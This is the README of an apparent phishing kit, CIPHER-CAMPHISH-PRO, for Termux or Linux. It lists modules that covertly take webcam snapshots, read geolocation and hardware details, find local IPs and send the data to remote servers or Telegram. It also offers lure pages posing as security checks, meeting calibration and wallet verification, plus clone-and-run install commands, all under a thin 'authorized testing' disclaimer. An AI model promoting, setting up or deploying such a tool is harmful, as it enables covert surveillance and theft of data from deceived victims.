# CIPHER-CAMPHISH-PRO
> **Deciphering the future before it happens..**

## Project Overview
CIPHER-CAMPHISH-PRO is an automated security tool designed to demonstrate browser-level vulnerabilities. It facilitates the auditing of metadata leakage, media stream security, and system telemetry. This framework is strictly for educational and authorized security testing.

## Release Metadata
* **Current Version:** 10.0.4-stable
* **Build Target:** Termux / Linux (Debian-based)
* **Exfiltration Protocol:** Asynchronous HTTPS / Telegram API

## Core Functionality
The tool implements several modules for client-side data extraction:

| Component | Technical Implementation |
| :--- | :--- |
| **Visual Capture** | Periodic WebRTC stream snapshots. |
| **System Profiling** | Extraction of hardware specs (GPU, RAM, CPU). |
| **Geolocation** | HTML5 Geolocation API mapping. |
| **Data Exfiltration** | Multi-threaded binary transfer to remote vaults. |
| **Network Audit** | Local IP discovery via WebRTC STUN requests. |

## Decoy Implementation
To ensure high engagement during authorized audits, the following templates are provided:
* Network Security Integrity Test
* Virtual Meeting Hardware Calibration
* Financial Wallet Security Verification

## Installation
```bash
git clone [https://github.com/cipher-attack/camphish-pro.git](https://github.com/cipher-attack/camphish-pro.git)
cd camphish-pro
chmod +x *
./cipher.sh
```
